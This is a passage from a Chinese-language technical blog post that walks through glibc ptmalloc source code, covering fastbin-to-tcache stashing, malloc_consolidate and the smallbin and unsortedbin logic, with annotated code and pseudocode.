class="comment">//检校一下这个堆块是不是插班生</span></span><br><span class="line">                malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">           ...</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//////////////////////////////////////</span></span><br><span class="line">      <span class="comment">////////////尝试缓存至tcache////////////</span></span><br><span class="line">      <span class="comment">//////////////////////////////////////        </span></span><br><span class="line">               </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);											<span class="comment">//堆块在给用户使用之前,把其中的数据全都擦除,防止信息泄露</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>实际上如果编译时开启了<code>USE_TCACHE</code>选项(默认是开启的),</p>
<p>在本次分配请求拿到堆块之后,在返回之前,还会先尝试把<code>fastbin</code>中的剩余的同样大小的堆块缓存到<code>tcache</code>中,直到<code>tcache</code>塞满或者<code>fastbin</code>空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE                              <span class="comment">//如果使用tcache, 下面要把fastbin中的堆块尝试缓存进入tcache,为下一次分配加速</span></span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">            <span class="type">size_t</span> tc_idx = csize2tidx(nb);                             <span class="comment">//计算nb大小的堆块,在tcache中的下标</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)                     <span class="comment">//判断是否在tcache范围中</span></span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//检查tcache对应桶是否有空间</span></span><br><span class="line">                &#123;<span class="comment">//while终止的条件,要么是tcache被狠狠塞满了,要么是fastbin一滴也不剩了</span></span><br><span class="line">                    <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = REVEAL_PTR(tc_victim-&gt;fd);									</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put(tc_victim, tc_idx);<span class="comment">//再塞一个</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h5><p>由于fastbins中的堆块不会被合并,处于一种不彻底释放的状态,可能导致外部碎片增加,比如假设某一时刻堆内存布局如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[64B @ smallbins][16B @ fastbins][64B @ smallbins]</span><br></pre></td></tr></table></figure>

<p>总计有<code>144B</code>的空闲内存空间</p>
<p>对于一个<code>128B</code>的请求, 却因为中间<code>fastbins</code>中的堆块不能被合并,而得不到满足</p>
<p>因此<code>malloc_consolidate</code>函数的职责,就是适时清理<code>fastbins</code>,尝试合并出大西瓜来,减少外部碎片</p>
<blockquote>
<p>外部碎片:</p>
<p>多次无规律的分配与释放之后堆内存中出现很多小空洞,</p>
<p>小空洞可能加起来有较大的空间,但是实际上不连续,不能满足一个真正的大空间申请</p>
<p>内部碎片:</p>
<p>因为元数据以及对齐因素,导致堆块实际大小大于所需大小所造成的内存浪费</p>
</blockquote>
<p><strong>malloc_consolidate发生时机</strong></p>
<p><code>malloc_consolidate</code>用于清扫<code>fastbins</code>中的黑户</p>
<p>可能发生的时机:</p>
<p>1.<code>malloc</code>请求不能在<code>tcache,fastbins,smallbins</code>中得到满足,并且此时<code>fastbins</code>中至少有一个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))		<span class="comment">//当fastbin中一旦有堆块,av-&gt;have_fastchunks就会被置位</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>2.当使用<code>topchunk</code>进行分配<strong>仍无法满足</strong>时,考虑到<code>fastbins</code>中的堆块可能合并到<code>topchunk</code>,以扩大<code>topchunk</code>,可能满足分配需求,因此此时也会尝试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">	...<span class="comment">//使用topchunk可以满足需求</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line"><span class="comment">//topchunk无法直接满足需求,尝试将fastbins中的黑户合并到topchunk,在下一个循环时重新尝试使用topchunk分配</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      &#123;</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          idx = smallbin_index (nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          idx = largebin_index (nb);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//到此说明fastbins已经全杀了,如果还不能满足分配需求,说明ptmalloc已经捉襟见肘了,需要系统调用brk,给堆区扩容了</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>3.在<code>free</code>时如果释放的堆块非常大,大于<code>65536</code>个字节,也就是<code>64KB</code>,并且此时<code>fastbins</code>中有东西,也会发生,目的是把<code>fastbins</code>中的黑户杀了,能合并到这个大块儿的就合并,然后调用<code>munmap</code>缩减堆区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4.<code>malloc_trim</code>被调用时,子函数<code>mtrim</code>会进行<code>malloc_consolidate</code>,这个<code>malloc_trim</code>作用是削减堆区空间返还给操作系统</p>
<blockquote>
<p>然而在glibc中并没有找到该函数的调用者,可能是提供给开发者手动管理内存用的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">mtrim (mstate av, size_t pad)</span><br><span class="line">&#123;</span><br><span class="line">  /* Ensure all blocks are consolidated.  */</span><br><span class="line">  malloc_consolidate (av);</span><br></pre></td></tr></table></figure>

<p><strong>malloc_consolidate的效果</strong></p>
<p>零帧起手,直接宣判<code>fastbins</code>中的堆块死刑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>意思是本函数执行完毕之后,<code>fastbins</code>中将无人生还</p>
<p>具体干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">从小到大遍历fastbins中的10个桶子,对于每个桶子:</span><br><span class="line">	如果桶子为空则continue</span><br><span class="line">	如果桶子不空:</span><br><span class="line">		遍历该桶子上挂的每个堆块,对于每个堆块:</span><br><span class="line">			· 如果物理上相邻的前块空闲 则:</span><br><span class="line">				向前合并,并将前块从其所在bin中unlink拆下来</span><br><span class="line"></span><br><span class="line">			· 如果物理上相邻的后块不是topchunk 则:</span><br><span class="line">				如果该后块空闲 则:</span><br><span class="line">					把后块从其所在bin中unlink拆下来,</span><br><span class="line">					当前块向后合并</span><br><span class="line">				如果后块正在使用 则:</span><br><span class="line">					后块的P标志归零</span><br><span class="line">				挂到unsortedbin上</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			· 如果物理上相邻的后块是topchunk 则:</span><br><span class="line">				合并到topchunk</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin(av, <span class="number">0</span>);   <span class="comment">//迭代遍历fastbins中的每个桶子,从第0个桶子开始,到最后一个</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;       <span class="comment">//从小到大遍历fastbins中的10个桶子</span></span><br><span class="line">    p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>)     <span class="comment">//桶子非空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(p)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">                                    <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(chunksize(p));</span><br><span class="line">                <span class="keyword">if</span> ((&amp;fastbin(av, idx)) != fb)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_inuse_chunk(av, p);</span><br><span class="line">            nextp = REVEAL_PTR(p-&gt;fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">            size = chunksize(p);</span><br><span class="line">            nextchunk = chunk_at_offset(p, size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">//尝试向前合并</span></span><br><span class="line">            &#123;</span><br><span class="line">                prevsize = prev_size(p);</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">                unlink_chunk(av, p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//尝试向后合并</span></span><br><span class="line">            &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">                &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink_chunk(av, nextchunk);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;  <span class="comment">//挂到unsortedbin上</span></span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p, size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">//合并到topchunk</span></span><br><span class="line">            &#123;</span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="小斌Smallbins"><a href="#小斌Smallbins" class="headerlink" title="小斌Smallbins"></a>小斌Smallbins</h3><p><code>bin_at(M,2~63)</code>这个范围是小斌</p>
<h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213732598.png" alt="image-20241026213732598"></p>
<p>带附加头节点的双向循环链表</p>
<p>桶子头到堆块的指针是裸露的</p>
<p>堆块之间的指针是加了密的,真是加了私权</p>
<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><p>小斌可能去这几个地方进货:</p>
<p>1.使用<code>malloc</code>时,如果轮到乱斌出力,如果乱斌发现自己管理的堆块实际上是小斌的范围,乱斌会扔给小斌</p>
<h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)					<span class="comment">//至少有一块</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))        <span class="comment">//类fastbin检查DF的唐氏方法</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE              <span class="comment">//类似于fastbin使用tcache缓冲的方法</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果不考虑tcache,那么相应一次malloc请求之后,smallbin长这样:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213926914.png" alt="image-20241026213926914"></p>
<h3 id="乱斌Unsortedbin"><a href="#乱斌Unsortedbin" class="headerlink" title="乱斌Unsortedbin"></a>乱斌Unsortedbin</h3><h4 id="algorithm-3"><a href="#algorithm-3" class="headerlink" title="algorithm"></a>algorithm</h4><p>乱斌是斌家的进口部长,大斌和小斌的货,都是乱斌给的</p>
<p>乱斌可能从这几个地方进货:</p>
<p>1.当<code>fastbins</code>中触发了<code>malloc_consolidate</code>之后,如果堆块没有被合并到<code>topchunk</code> ,那么其归宿就是<code>unsortedbin</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">...</span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>2.在<code>free</code>时,如果堆块不是<code>mmap</code>的,并且<code>tcache</code>,<code>fastbins</code>都没能留住堆块,并且堆块没有被合并到<code>topchunk</code>,那么其归宿就是<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))         <span class="comment">//尝试向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);        <span class="comment">//向后合并</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);      <span class="comment">//挂到unsortedbin上</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.在malloc时,如果从<code>unsorted</code>中切割了一个大块满足一个小块的分配请求,那么剩余块会被重新挂到<code>unsortedbin</code>中</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><p>如果一个堆块被<code>free</code>之后,既没有被<code>tcache</code>,<code>fastbins</code>留住,也不是<code>mmap</code>映射块,那么此时该堆块可能有两种归宿:</p>
<p>1.物理上与<code>topchunk</code>相邻,合并到<code>topchunk</code></p>
<p>2.不与<code>topchunk</code>相邻,挂到<code>unsortedbin</code>上</p>
<p>[不太可能发生的]如果该堆块过大,超过<code>fastbins</code>合并阈值(64K),会触发堆内存缩减</p>
